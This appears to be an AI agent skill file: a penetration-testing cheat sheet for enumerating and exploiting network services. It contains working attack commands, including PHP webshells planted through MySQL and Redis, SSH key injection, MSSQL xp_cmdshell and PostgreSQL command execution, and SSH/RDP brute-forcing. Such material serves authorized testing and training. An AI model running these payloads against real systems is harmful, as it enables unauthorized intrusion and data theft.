---
name: enumerating-network-services
description: Enumerate and exploit network services including SMB, FTP, SSH, RDP, HTTP, databases (MySQL, MSSQL, PostgreSQL, MongoDB), LDAP, NFS, DNS, and SNMP. Use when testing network service security or performing port-based exploitation.
---

# Network Service Enumeration Skill

You are a network penetration testing expert specializing in service enumeration and exploitation. Use this skill when the user requests help with:

- Enumerating network services by port
- Exploiting common network services (SMB, FTP, SSH, RDP, etc.)
- Database service testing (MySQL, MSSQL, PostgreSQL, MongoDB)
- Service-specific vulnerability identification
- Banner grabbing and version detection
- Network protocol analysis

## Core Methodologies

### 1. Port Scanning and Service Discovery

**Nmap Scanning Strategies:**
```bash
# Quick TCP scan
nmap -sC -sV -oA scan 10.10.10.10

# Full TCP port scan
nmap -p- -T4 10.10.10.10
nmap -p- -sV -sC -A 10.10.10.10 -oA full-scan

# UDP scan (top 1000)
sudo nmap -sU --top-ports 1000 10.10.10.10

# Aggressive scan
nmap -A -T4 10.10.10.10

# Specific port scan with scripts
nmap -p 445 --script smb-* 10.10.10.10
nmap -p 21 --script ftp-* 10.10.10.10

# Service version detection
nmap -sV --version-intensity 9 10.10.10.10

# OS detection
sudo nmap -O 10.10.10.10
```

**Fast Port Scanning:**
```bash
# masscan - very fast
masscan -p1-65535 10.10.10.10 --rate=1000

# rustscan - fast with nmap integration
rustscan -a 10.10.10.10 -- -sC -sV
```

### 2. SMB/SAMBA (Port 139, 445)

**Enumeration:**
```bash
# Nmap SMB scripts
nmap -p 445 --script smb-protocols 10.10.10.10
nmap -p 445 --script smb-security-mode 10.10.10.10
nmap -p 445 --script smb-enum-shares 10.10.10.10
nmap -p 445 --script smb-enum-users 10.10.10.10

# smbclient - list shares
smbclient -L //10.10.10.10 -N
smbclient -L //10.10.10.10 -U username

# smbmap
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u username -p password
smbmap -H 10.10.10.10 -u username -p password -R  # Recursive listing

# enum4linux
enum4linux -a 10.10.10.10
enum4linux -U -M -S -P -G 10.10.10.10

# crackmapexec
crackmapexec smb 10.10.10.10
crackmapexec smb 10.10.10.10 -u '' -p ''  # Null session
crackmapexec smb 10.10.10.10 -u username -p password --shares
crackmapexec smb 10.10.10.10 -u username -p password --users
```

**Connect to Shares:**
```bash
# smbclient
smbclient //10.10.10.10/share -U username
smbclient //10.10.10.10/share -N  # Null session

# Mount SMB share
mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass

# Download all files recursively
smbget -R smb://10.10.10.10/share -U username
```

**SMB Vulnerabilities:**
```bash
# EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10

# Other SMB vulns
nmap -p 445 --script smb-vuln-* 10.10.10.10
```

### 3. FTP (Port 21)

**Enumeration:**
```bash
# Connect anonymously
ftp 10.10.10.10
# user: anonymous, pass: anonymous

# Nmap FTP scripts
nmap -p 21 --script ftp-anon 10.10.10.10
nmap -p 21 --script ftp-bounce 10.10.10.10
nmap -p 21 --script ftp-brute 10.10.10.10

# Download all files
wget -r ftp://anonymous:anonymous@10.10.10.10/
```

**FTP Commands:**
```bash
# In FTP session
ls -la
cd directory
get filename  # Download
mget *  # Download multiple
put filename  # Upload
binary  # Set binary mode for binaries
```

### 4. SSH (Port 22)

**Enumeration:**
```bash
# Banner grab
nc 10.10.10.10 22
nmap -p 22 -sV 10.10.10.10

# Enumerate users
./ssh-user-enum.py --port 22 --userList users.txt 10.10.10.10

# Brute force (use carefully)
hydra -l root -P wordlist.txt ssh://10.10.10.10
```

**SSH Key Auth:**
```bash
# Connect with key
ssh -i id_rsa user@10.10.10.10

# Fix key permissions
chmod 600 id_rsa

# Generate SSH key pair
ssh-keygen -t rsa -b 4096
```

### 5. HTTP/HTTPS (Port 80, 443, 8080, 8443)

**Web Enumeration:**
```bash
# Whatweb - identify web technologies
whatweb http://10.10.10.10

# Nikto vulnerability scanner
nikto -h http://10.10.10.10

# Directory/file bruteforce
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://10.10.10.10 -w wordlist.txt
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt

# DNS subdomain enumeration
gobuster dns -d example.com -w subdomains.txt
ffuf -u http://FUZZ.example.com -w subdomains.txt

# Virtual host discovery
gobuster vhost -u http://10.10.10.10 -w vhosts.txt
```

**SSL/TLS Testing:**
```bash
# Check SSL certificate
openssl s_client -connect 10.10.10.10:443

# SSL vulnerabilities
nmap -p 443 --script ssl-* 10.10.10.10
testssl.sh https://10.10.10.10
```

### 6. RDP (Port 3389)

**Enumeration:**
```bash
# Nmap
nmap -p 3389 --script rdp-* 10.10.10.10

# Check if RDP is enabled
nmap -p 3389 -sV 10.10.10.10
```

**Connect:**
```bash
# rdesktop
rdesktop 10.10.10.10

# xfreerdp
xfreerdp /u:Administrator /p:password /v:10.10.10.10
xfreerdp /u:user /d:DOMAIN /v:10.10.10.10
```

**Brute Force:**
```bash
# hydra
hydra -l administrator -P passwords.txt rdp://10.10.10.10

# crowbar
crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt
```

### 7. MySQL/MariaDB (Port 3306)

**Enumeration:**
```bash
# Nmap
nmap -p 3306 --script mysql-* 10.10.10.10

# Connect
mysql -h 10.10.10.10 -u root -p
mysql -h 10.10.10.10 -u root
```

**MySQL Commands:**
```sql
-- Show databases
SHOW DATABASES;
USE database_name;

-- Show tables
SHOW TABLES;
DESCRIBE table_name;

-- Read data
SELECT * FROM table_name;
SELECT user,password FROM mysql.user;

-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Command execution (UDF)
SELECT sys_exec('whoami');
```

### 8. MSSQL (Port 1433)

**Enumeration:**
```bash
# Nmap
nmap -p 1433 --script ms-sql-* 10.10.10.10

# Connect with impacket
mssqlclient.py user:password@10.10.10.10
mssqlclient.py user:password@10.10.10.10 -windows-auth  # Windows auth
```

**MSSQL Commands:**
```sql
-- Version
SELECT @@version;

-- Databases
SELECT name FROM sys.databases;

-- Current user
SELECT USER_NAME();
SELECT SYSTEM_USER;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
```

### 9. PostgreSQL (Port 5432)

**Connect:**
```bash
# psql
psql -h 10.10.10.10 -U postgres
psql -h 10.10.10.10 -U postgres -d database_name

# Nmap
nmap -p 5432 --script pgsql-* 10.10.10.10
```

**PostgreSQL Commands:**
```sql
-- List databases
\l

-- Connect to database
\c database_name

-- List tables
\dt

-- Current user
SELECT current_user;

-- Read files
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

-- Command execution (requires superuser)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
```

### 10. MongoDB (Port 27017)

**Enumeration:**
```bash
# Nmap
nmap -p 27017 --script mongodb-* 10.10.10.10

# Connect
mongo 10.10.10.10
mongo 10.10.10.10/database
```

**MongoDB Commands:**
```javascript
// Show databases
show dbs

// Use database
use database_name

// Show collections
show collections

// Find documents
db.collection.find()
db.collection.find().pretty()

// Count documents
db.collection.count()

// Dump all data
db.collection.find().forEach(printjson)
```

### 11. Redis (Port 6379)

**Enumeration:**
```bash
# Connect
redis-cli -h 10.10.10.10

# Nmap
nmap -p 6379 --script redis-* 10.10.10.10
```

**Redis Exploitation:**
```bash
# In redis-cli
INFO  # Server info
CONFIG GET dir  # Get directory
CONFIG GET dbfilename

# Write SSH key
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET mykey "ssh-rsa AAAA..."
SAVE

# Write webshell
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET mykey "<?php system($_GET['cmd']); ?>"
SAVE
```

### 12. LDAP (Port 389, 636)

**Enumeration:**
```bash
# Nmap
nmap -p 389 --script ldap-* 10.10.10.10

# ldapsearch
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local"

# Dump all
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=*)"
```

### 13. NFS (Port 2049)

**Enumeration:**
```bash
# Show exports
showmount -e 10.10.10.10

# Nmap
nmap -p 2049 --script nfs-* 10.10.10.10
```

**Mount NFS:**
```bash
# Mount share
mkdir /mnt/nfs
mount -t nfs 10.10.10.10:/share /mnt/nfs

# List mounted shares
df -h
```

### 14. DNS (Port 53)

**Enumeration:**
```bash
# Zone transfer
dig axfr @10.10.10.10 domain.com
host -l domain.com 10.10.10.10

# DNS enumeration
dnsenum domain.com
dnsrecon -d domain.com -t std
fierce -dns domain.com

# Nmap
nmap -p 53 --script dns-* 10.10.10.10
```

### 15. SNMP (Port 161)

**Enumeration:**
```bash
# snmpwalk
snmpwalk -v2c -c public 10.10.10.10
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1

# onesixtyone - community string brute force
onesixtyone -c community.txt 10.10.10.10

# snmp-check
snmp-check 10.10.10.10 -c public
```

## Quick Service Testing Commands

**Banner Grabbing:**
```bash
# Netcat
nc -nv 10.10.10.10 80
nc -nv 10.10.10.10 21

# Telnet
telnet 10.10.10.10 80
telnet 10.10.10.10 25

# Nmap
nmap -sV --script=banner 10.10.10.10
```

## Reference Links

- HackTricks Service Pentesting: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/network-services-pentesting
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Nmap Scripts: https://nmap.org/nsedoc/

## When to Use This Skill

Activate this skill when the user asks to:
- Enumerate network services on specific ports
- Test common network service vulnerabilities
- Connect to and exploit database services
- Perform service-specific reconnaissance
- Identify service misconfigurations
- Extract data from network services
- Help with network penetration testing

Always ensure proper authorization before testing any network services.
